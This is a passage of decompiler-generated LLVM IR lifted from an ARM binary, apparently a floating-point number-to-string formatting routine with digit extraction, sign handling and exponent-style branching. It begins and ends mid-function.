  store i32 %v0_12e0c, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_12e7c = fptrunc double %arg2 to float
  %v2_12e7c = bitcast float %v1_12e7c to i32
  %v9_12e7c = call i32 @__aeabi_dcmpeq(i32 %v2_12e7c, i32 %v0_12e0c, i32 %v2_12e7c, i32 %v0_12e0c, i32 0)
  store i32 %v9_12e7c, i32* %r0.global-to-local, align 4
  %v2_12e80 = icmp eq i32 %v9_12e7c, 0
  store i1 %v2_12e80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12e80, label %bb207, label %dec_label_pc_12e90

bb207:                                            ; preds = %dec_label_pc_12e60
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12e90:                               ; preds = %dec_label_pc_12e60
  %v0_12e90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12e90, i32* @r0, align 4
  %v0_12e94 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12e94, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_12ea0 = call i32 @__aeabi_dcmpeq(i32 %v0_12e90, i32 %v0_12e94, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_12ea0, i32* %r0.global-to-local, align 4
  %v2_12ea4 = icmp eq i32 %v7_12ea0, 0
  store i1 %v2_12ea4, i1* %cpsr_z.global-to-local, align 1
  %v0_12eec = load i32, i32* %r5.global-to-local, align 4
  %v1_12eec = sext i32 %v0_12eec to i64
  %v2_12eec = bitcast i64 %v1_12eec to double
  br i1 %v2_12ea4, label %dec_label_pc_12eec, label %dec_label_pc_12eac

dec_label_pc_12eac:                               ; preds = %dec_label_pc_12e90
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_12ebc = fdiv double 0.000000e+00, %v2_12eec
  %v10_12ebc = fptrunc double %v9_12ebc to float
  %v11_12ebc = bitcast float %v10_12ebc to i32
  store i32 %v11_12ebc, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_12ec8 = call i32 @__aeabi_dcmplt(i32 %v11_12ebc, i32 1072693248, i32 0, i32 0)
  store i32 %v4_12ec8, i32* %r0.global-to-local, align 4
  %v2_12ecc = icmp eq i32 %v4_12ec8, 0
  store i1 %v2_12ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ecc, label %bb208, label %dec_label_pc_12ed8

bb208:                                            ; preds = %dec_label_pc_12eac
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_130b8

dec_label_pc_12ed8:                               ; preds = %dec_label_pc_12eac
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_130b8

dec_label_pc_12eec:                               ; preds = %dec_label_pc_12e90
  store i32 %v0_12eec, i32* @r0, align 4
  %v0_12ef0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12ef0, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12efc = fptrunc double %v2_12eec to float
  %v2_12efc = bitcast float %v1_12efc to i32
  %v6_12efc = call i32 @__aeabi_dcmplt(i32 %v2_12efc, i32 %v0_12ef0, i32 0, i32 0)
  store i32 %v6_12efc, i32* %r0.global-to-local, align 4
  %v2_12f00 = icmp eq i32 %v6_12efc, 0
  store i1 %v2_12f00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12f00, label %dec_label_pc_12eec..thread9_crit_edge, label %bb209

dec_label_pc_12eec..thread9_crit_edge:            ; preds = %dec_label_pc_12eec
  %v0_12f20.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_12eec
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_12f08 = load i32, i32* %r6.global-to-local, align 4
  %v2_12f08 = sub i32 0, %v1_12f08
  store i32 %v2_12f08, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_12f08, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_12eec..thread9_crit_edge, %bb209
  %v0_12f20 = phi i32 [ %v0_12f20.pre, %dec_label_pc_12eec..thread9_crit_edge ], [ %v2_12f08, %bb209 ]
  %v0_12f1c = load i32, i32* %r5.global-to-local, align 4
  %v1_12f1c = sext i32 %v0_12f1c to i64
  %v2_12f1c = bitcast i64 %v1_12f1c to double
  %v9_12f24 = fmul double %v2_12f1c, 0.000000e+00
  %v10_12f24 = fptrunc double %v9_12f24 to float
  %v11_12f24 = bitcast float %v10_12f24 to i32
  store i32 %v11_12f24, i32* @r2, align 4
  store i32 %v0_12f20, i32* %r3.global-to-local, align 4
  store i32 %v0_12f1c, i32* @r0, align 4
  store i32 %v0_12f20, i32* %r1.global-to-local, align 4
  %v7_12f38 = call i32 @__aeabi_dcmpeq(i32 %v0_12f1c, i32 %v0_12f20, i32 %v11_12f24, i32 %v0_12f20, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_12f38, i32* %r0.global-to-local, align 4
  %v2_12f3c = icmp eq i32 %v7_12f38, 0
  store i1 %v2_12f3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12f3c, label %dec_label_pc_12f90, label %.thread9.dec_label_pc_12f44_crit_edge

.thread9.dec_label_pc_12f44_crit_edge:            ; preds = %.thread9
  %v3_12f44.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12f44:                               ; preds = %bb207, %.thread9.dec_label_pc_12f44_crit_edge
  %v3_12f44 = phi i32 [ %v3_12f44.pre, %.thread9.dec_label_pc_12f44_crit_edge ], [ %arg4, %bb207 ]
  %v1_12e88.v0_12e745 = phi i32 [ 0, %.thread9.dec_label_pc_12f44_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_12f44, i32* %ip.global-to-local, align 4
  %v2_12f4c = add i32 %v3_12f44, 16
  %v3_12f4c = inttoptr i32 %v2_12f4c to i32*
  store i32 32, i32* %v3_12f4c, align 4
  %v0_12f54 = load i32, i32* %sb.global-to-local, align 4
  %v7_12f54 = icmp eq i32 %v0_12f54, 96
  store i1 %v7_12f54, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_12f54, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_12f44
  %v5_12f68 = or i32 %v1_12e88.v0_12e745, 4
  store i32 %v5_12f68, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_12f44, %bb210
  %v4_12f6c = phi i32 [ %v5_12f68, %bb210 ], [ 3, %dec_label_pc_12f44 ]
  %v4_12f6c.v1_12e88.v0_12e74 = select i1 %tmp274, i32 %v4_12f6c, i32 %v1_12e88.v0_12e745
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33340), i32* %r3.global-to-local, align 4
  %v2_12f80 = add i32 %v4_12f6c.v1_12e88.v0_12e74, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33340)
  store i32 %v2_12f80, i32* %r2.global-to-local, align 4
  %v2_12f84 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_12f84, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_134ac

dec_label_pc_12f90:                               ; preds = %.thread9
  %v0_12f90 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12f90, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_12f98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12f98, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_12fa0 = call i32 @__aeabi_dcmplt(i32 %v0_12f98, i32 %v0_12f90, i32 0, i32 1100470148)
  store i32 %v6_12fa0, i32* %r0.global-to-local, align 4
  %v2_12fa4 = icmp eq i32 %v6_12fa0, 0
  store i1 %v2_12fa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12fa4, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_12f90
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_12f90, %bb211
  %v0_12fac = phi i32 [ 0, %dec_label_pc_12f90 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33316), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33316), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_12fe0 = icmp eq i32 %v0_12fac, 0
  br label %dec_label_pc_12fd0

dec_label_pc_12fd0:                               ; preds = %dec_label_pc_13068.dec_label_pc_12fd0_crit_edge, %bb212
  %v2_12fd8 = phi i32 [ add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33316), %bb212 ], [ %v2_12fd8.pre, %dec_label_pc_13068.dec_label_pc_12fd0_crit_edge ]
  %v0_12fd4 = phi i32 [ 9, %bb212 ], [ %v0_13068, %dec_label_pc_13068.dec_label_pc_12fd0_crit_edge ]
  %v2_13018 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_13068.dec_label_pc_12fd0_crit_edge ]
  store i32 %v0_12fac, i32* %r2.global-to-local, align 4
  %v1_12fd4 = add i32 %v0_12fd4, -1
  store i32 %v1_12fd4, i32* %sl.global-to-local, align 4
  store i32 %v2_12fd8, i32* @lr, align 4
  %v3_12fdc = mul i32 %v1_12fd4, 8
  store i32 %v3_12fdc, i32* %r3.global-to-local, align 4
  store i1 %v2_12fe0, i1* %cpsr_z.global-to-local, align 1
  %v0_12fe4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12fe4, i32* %r0.global-to-local, align 4
  %v0_12fe8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12fe8, i32* %r1.global-to-local, align 4
  %v2_12fec = add i32 %v3_12fdc, %v2_12fd8
  store i32 %v2_12fec, i32* %ip.global-to-local, align 4
  %v1_13028 = inttoptr i32 %v2_12fec to i32*
  %v2_13028 = load i32, i32* %v1_13028, align 4
  %v3_13028 = sext i32 %v2_13028 to i64
  %v1_1302c = sext i32 %v0_12fe4 to i64
  %v2_1302c = bitcast i64 %v1_1302c to double
  br i1 %v2_12fe0, label %dec_label_pc_13028, label %dec_label_pc_12ff4

dec_label_pc_12ff4:                               ; preds = %dec_label_pc_12fd0
  %v8_12ff8 = bitcast i64 %v3_13028 to double
  %v9_12ff8 = fmul double %v2_1302c, %v8_12ff8
  %v10_12ff8 = fptrunc double %v9_12ff8 to float
  %v11_12ff8 = bitcast float %v10_12ff8 to i32
  store i32 %v11_12ff8, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_12ff8, i32* %r7.global-to-local, align 4
  store i32 %v0_12fe8, i32* %r8.global-to-local, align 4
  %v4_1300c = call i32 @__aeabi_dcmplt(i32 %v11_12ff8, i32 %v0_12fe8, i32 0, i32 1104006501)
  store i32 %v4_1300c, i32* %r0.global-to-local, align 4
  %v2_13010 = icmp eq i32 %v4_1300c, 0
  store i1 %v2_13010, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13010, label %dec_label_pc_13068, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_12ff4
  %v1_13018 = load i32, i32* %r4.global-to-local, align 4
  %v3_13018 = sub i32 %v2_13018, %v1_13018
  store i32 %v3_13018, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13060

dec_label_pc_13028:                               ; preds = %dec_label_pc_12fd0
  store i32 %v0_12fe8, i32* @r1, align 4
  %v8_13034 = bitcast i64 %v3_13028 to double
  %v9_13034 = fdiv double %v2_1302c, %v8_13034
  %v10_13034 = fptrunc double %v9_13034 to float
  %v11_13034 = bitcast float %v10_13034 to i32
  store i32 %v11_13034, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_13034, i32* %r7.global-to-local, align 4
  store i32 %v0_12fe8, i32* %r8.global-to-local, align 4
  %v4_13048 = call i32 @__aeabi_dcmpge(i32 %v11_13034, i32 %v0_12fe8, i32 0, i32 1100470148)
  store i32 %v4_13048, i32* %r0.global-to-local, align 4
  %v2_1304c = icmp eq i32 %v4_13048, 0
  store i1 %v2_1304c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1304c, label %dec_label_pc_13068, label %dec_label_pc_13054

dec_label_pc_13054:                               ; preds = %dec_label_pc_13028
  %v1_13058 = load i32, i32* %r4.global-to-local, align 4
  %v2_13058 = add i32 %v1_13058, %v2_13018
  store i32 %v2_13058, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13060

dec_label_pc_13060:                               ; preds = %.thread10, %dec_label_pc_13054
  %stack_var_-192.2 = phi i32 [ %v2_13058, %dec_label_pc_13054 ], [ %v3_13018, %.thread10 ]
  %v0_13060 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13060, i32* %r5.global-to-local, align 4
  %v0_13064 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13064, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13068

dec_label_pc_13068:                               ; preds = %dec_label_pc_12ff4, %dec_label_pc_13028, %dec_label_pc_13060
  %stack_var_-192.3 = phi i32 [ %v2_13018, %dec_label_pc_13028 ], [ %stack_var_-192.2, %dec_label_pc_13060 ], [ %v2_13018, %dec_label_pc_12ff4 ]
  %v0_13068 = load i32, i32* %sl.global-to-local, align 4
  %v2_13068 = icmp eq i32 %v0_13068, 0
  store i1 %v2_13068, i1* %cpsr_z.global-to-local, align 1
  %v0_1306c = load i32, i32* %r4.global-to-local, align 4
  %v3_1306c = sdiv i32 %v0_1306c, 2
  store i32 %v3_1306c, i32* %r4.global-to-local, align 4
  br i1 %v2_13068, label %dec_label_pc_13074, label %dec_label_pc_13068.dec_label_pc_12fd0_crit_edge

dec_label_pc_13068.dec_label_pc_12fd0_crit_edge:  ; preds = %dec_label_pc_13068
  %v2_12fd8.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_12fd0

dec_label_pc_13074:                               ; preds = %dec_label_pc_13068
  %v0_13074 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13074, i32* @r0, align 4
  %v0_13078 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13078, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_13084 = call i32 @__aeabi_dcmpge(i32 %v0_13074, i32 %v0_13078, i32 0, i32 1104006501)
  store i32 %v6_13084, i32* %r0.global-to-local, align 4
  %v2_13088 = icmp eq i32 %v6_13084, 0
  store i1 %v2_13088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13088, label %dec_label_pc_130b8, label %dec_label_pc_13090

dec_label_pc_13090:                               ; preds = %dec_label_pc_13074
  %v0_13090 = load i32, i32* %r5.global-to-local, align 4
  %v1_13090 = sext i32 %v0_13090 to i64
  %v2_13090 = bitcast i64 %v1_13090 to double
  %v0_13094 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13094, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_130a0 = fdiv double %v2_13090, 0.000000e+00
  %v10_130a0 = fptrunc double %v9_130a0 to float
  %v11_130a0 = bitcast float %v10_130a0 to i32
  store i32 %v11_130a0, i32* %r0.global-to-local, align 4
  store i32 %v11_130a0, i32* %r5.global-to-local, align 4
  %v1_130b0 = add i32 %stack_var_-192.3, 1
  store i32 %v1_130b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_130b8

dec_label_pc_130b8:                               ; preds = %dec_label_pc_13090, %bb208, %dec_label_pc_13074, %dec_label_pc_12ed8
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_13074 ], [ -1, %dec_label_pc_12ed8 ], [ -1, %bb208 ], [ %v1_130b0, %dec_label_pc_13090 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_130bc = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_130bc, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_130c0

dec_label_pc_130c0:                               ; preds = %dec_label_pc_13138, %dec_label_pc_130b8
  %v0_130c0 = load i32, i32* %r6.global-to-local, align 4
  %v0_130c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_130c8 = sext i32 %v0_130c4 to i64
  %v2_130c8 = bitcast i64 %v1_130c8 to double
  %v3_130c8 = fptoui double %v2_130c8 to i32
  store i32 %v3_130c8, i32* %r8.global-to-local, align 4
  store i32 %v3_130c8, i32* %r2.global-to-local, align 4
  store i32 %v0_130c0, i32* %r3.global-to-local, align 4
  store i32 %v0_130c4, i32* @r0, align 4
  store i32 %v0_130c0, i32* %r1.global-to-local, align 4
  %v6_130e4 = call i32 @__aeabi_dsub(i32 %v0_130c4, i32 %v0_130c0, i32 %v3_130c8, i32 %v0_130c0)
  %v7_130e4 = sext i32 %v6_130e4 to i64
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v3_130f0 = bitcast i64 %v7_130e4 to double
  %v9_130f0 = fmul double %v3_130f0, 0.000000e+00
  %v10_130f0 = fptrunc double %v9_130f0 to float
  %v11_130f0 = bitcast float %v10_130f0 to i32
  store i32 %v11_130f0, i32* %r0.global-to-local, align 4
  %v0_130f4 = load i32, i32* %sl.global-to-local, align 4
  %v1_130f4 = add i32 %v0_130f4, 9
  store i32 %v1_130f4, i32* %sl.global-to-local, align 4
  store i32 %v11_130f0, i32* %r5.global-to-local, align 4
  store i32 %v0_130c0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_13104.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13104

dec_label_pc_13104:                               ; preds = %dec_label_pc_13104.dec_label_pc_13104_crit_edge, %dec_label_pc_130c0
  %v1_13118 = phi i32 [ %v1_13118.pre, %dec_label_pc_13104.dec_label_pc_13104_crit_edge ], [ %v1_130f4, %dec_label_pc_130c0 ]
  %v0_13110 = phi i32 [ %v0_1312c, %dec_label_pc_13104.dec_label_pc_13104_crit_edge ], [ 0, %dec_label_pc_130c0 ]
  %v0_1311c = phi i32 [ %v2_13128, %dec_label_pc_13104.dec_label_pc_13104_crit_edge ], [ %v0_13104.pre, %dec_label_pc_130c0 ]
  %v3_1310c = urem i32 %v0_1311c, 10
  %v1_13110 = add i32 %v0_13110, 1
  store i32 %v1_13110, i32* %r7.global-to-local, align 4
  %v1_13114 = or i32 %v3_1310c, 48
  store i32 %v1_13114, i32* %r2.global-to-local, align 4
  %v2_13118 = sub i32 %v1_13118, %v1_13110
  store i32 %v2_13118, i32* %r3.global-to-local, align 4
  store i32 %v0_1311c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_13124 = trunc i32 %v1_13114 to i8
  %v3_13124 = inttoptr i32 %v2_13118 to i8*
  store i8 %v1_13124, i8* %v3_13124, align 1
  %v0_13128 = load i32, i32* %r0.global-to-local, align 4
  %v1_13128 = load i32, i32* %r1.global-to-local, align 4
  %v2_13128 = udiv i32 %v0_13128, %v1_13128
  store i32 %v2_13128, i32* %r0.global-to-local, align 4
  %v0_1312c = load i32, i32* %r7.global-to-local, align 4
  %v7_1312c = icmp eq i32 %v0_1312c, 8
  store i1 %v7_1312c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_13128, i32* %r8.global-to-local, align 4
  %v7_13134 = icmp slt i32 %v0_1312c, 9
  br i1 %v7_13134, label %dec_label_pc_13104.dec_label_pc_13104_crit_edge, label %dec_label_pc_13138

dec_label_pc_13104.dec_label_pc_13104_crit_edge:  ; preds = %dec_label_pc_13104
  %v1_13118.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13104

dec_label_pc_13138:                               ; preds = %dec_label_pc_13104
  %v0_13138 = load i32, i32* %r4.global-to-local, align 4
  %v1_13138 = add i32 %v0_13138, 1
  store i32 %v1_13138, i32* %r4.global-to-local, align 4
  %v7_1313c = icmp eq i32 %v0_13138, 0
  store i1 %v7_1313c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1313c, label %dec_label_pc_130c0, label %dec_label_pc_13144

dec_label_pc_13144:                               ; preds = %dec_label_pc_13138
  %v0_13144 = load i32, i32* %sb.global-to-local, align 4
  %v7_13144 = icmp eq i32 %v0_13144, 96
  store i1 %v7_13144, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_13144, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_13144
  %v5_13154 = add i32 %v0_13144, 32
  store i32 %v5_13154, i32* %r3.global-to-local, align 4
  %v5_13158 = urem i32 %v5_13154, 256
  store i32 %v5_13158, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_13144
  %v4_13150.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_13150.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_13150126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_13178 = phi i32 [ %v0_13144, %thread-pre-split ], [ %v5_13158, %bb213 ]
  %v7_1315c = icmp eq i32 %v0_13178, 103
  %. = zext i1 %v7_1315c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_13168 = load i32, i32* %fp.global-to-local, align 4
  %v2_13168 = icmp eq i32 %v0_13168, 0
  store i1 %v2_13168, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_13168, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_13170 = icmp eq i1 %v7_1315c, false
  store i1 %v2_13170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13170, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_13174 = add i32 %v0_13168, -1
  store i32 %v2_13174, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_13188 = phi i32 [ %v0_13168, %.thread16 ], [ %v0_13168, %bb218 ], [ %v2_13174, %bb219 ]
  %v7_13178 = icmp eq i32 %v0_13178, 102
  store i1 %v7_13178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13178, label %dec_label_pc_13184, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_13188, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_131ac

dec_label_pc_13184:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_13188 = add i32 %v0_13188, %stack_var_-192.4
  store i32 %v2_13188, i32* %ip.global-to-local, align 4
  %v8_1318c = icmp eq i32 %v2_13188, -1
  store i1 %v8_1318c, i1* %cpsr_z.global-to-local, align 1
  %v6_13190 = icmp slt i32 %v2_13188, -1
  br i1 %v6_13190, label %dec_label_pc_13194, label %dec_label_pc_131ac

dec_label_pc_13194:                               ; preds = %dec_label_pc_13184
  %v2_13194 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_13194, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_131a0 = bitcast i32* %stack_var_-83 to i8*
  %v4_131a0 = call i32 @__GI_memset(i8* %v3_131a0, i32 48, i32 17)
  store i32 %v4_131a0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_131ac

dec_label_pc_131ac:                               ; preds = %bb221, %dec_label_pc_13184, %dec_label_pc_13194
  %v1_131f092 = phi i32 [ %v4_131a0, %dec_label_pc_13194 ], [ %v2_13128, %dec_label_pc_13184 ], [ %v2_13128, %bb221 ]
  %v1_131d4 = phi i32 [ -1, %dec_label_pc_13194 ], [ %v2_13188, %dec_label_pc_13184 ], [ %v0_13188, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_13194 ], [ %stack_var_-192.4, %dec_label_pc_13184 ], [ %stack_var_-192.4, %bb221 ]
  %v1_131b0 = add i32 %v1_131d4, -16
  %v3_131b0 = sub i32 15, %v1_131d4
  %v4_131b0 = and i32 %v3_131b0, %v1_131d4
  %v5_131b0 = icmp slt i32 %v4_131b0, 0
  %v6_131b0 = icmp slt i32 %v1_131b0, 0
  %v7_131b0 = icmp eq i32 %v1_131d4, 16
  store i1 %v7_131b0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_131bc = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_131bc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_131c4 = xor i1 %v6_131b0, %v5_131b0
  %v4_131c4 = or i1 %v7_131b0, %v3_131c4
  br i1 %v4_131c4, label %dec_label_pc_131d0, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_131ac
  %v7_131c4137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_131c4137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_131d0:                               ; preds = %dec_label_pc_131ac
  %v2_131d0 = ptrtoint i32* %stack_var_-82 to i32
  %v2_131d4 = add i32 %v1_131d4, %v2_131d0
  store i32 %v2_131d4, i32* %r3.global-to-local, align 4
  %v1_131d8 = add i32 %v2_131d4, 2
  %v2_131d8 = inttoptr i32 %v1_131d8 to i8*
  %v3_131d8 = load i8, i8* %v2_131d8, align 1
  %v4_131d8 = zext i8 %v3_131d8 to i32
  store i32 %v4_131d8, i32* %r2.global-to-local, align 4
  store i32 %v1_131d8, i32* %r1.global-to-local, align 4
  %v2_131e0 = icmp ugt i8 %v3_131d8, 51
  %v7_131e0 = icmp eq i8 %v3_131d8, 52
  store i1 %v7_131e0, i1* %cpsr_z.global-to-local, align 1
  %v2_131e4 = xor i1 %v2_131e0, true
  %v3_131e4 = or i1 %v7_131e0, %v2_131e4
  br i1 %v3_131e4, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_131d0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_131d0, %bb222
  %v1_131f090 = phi i32 [ %v1_131f092, %dec_label_pc_131d0 ], [ 0, %bb222 ]
  %v2_131e8 = xor i1 %v7_131e0, true
  %v3_131e8 = and i1 %v2_131e0, %v2_131e8
  br i1 %v3_131e8, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_131ec = phi i32 [ %v0_131ec.pre, %._crit_edge87 ], [ %v7_131c4137141, %.thread140 ], [ %v1_131d8, %bb223 ], [ %v1_131d8, %bb224 ]
  %v1_131f0 = phi i32 [ %v1_131f0.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_131f090, %bb223 ], [ 1, %bb224 ]
  %v1_131ec = add i32 %v0_131ec, -1
  %v2_131ec = inttoptr i32 %v1_131ec to i8*
  %v3_131ec = load i8, i8* %v2_131ec, align 1
  %v4_131ec = zext i8 %v3_131ec to i32
  store i32 %v1_131ec, i32* %r1.global-to-local, align 4
  %v2_131f0 = add i32 %v4_131ec, %v1_131f0
  %v1_131f4 = urem i32 %v2_131f0, 256
  store i32 %v1_131f4, i32* %r3.global-to-local, align 4
  %v2_131f8 = icmp ugt i32 %v1_131f4, 56
  %v7_131f8 = icmp eq i32 %v1_131f4, 57
  store i1 %v7_131f8, i1* %cpsr_z.global-to-local, align 1
  %v2_131fc = xor i1 %v2_131f8, true
  %v3_131fc = or i1 %v7_131f8, %v2_131fc
  br i1 %v3_131fc, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_13200 = xor i1 %v7_131f8, true
  %v3_13200 = and i1 %v2_131f8, %v2_13200
  br i1 %v3_13200, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_13208.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_13208 = phi i32 [ %v1_13208.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_13204 = icmp eq i32 %v1_131f4, 48
  store i1 %v7_13204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13204, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
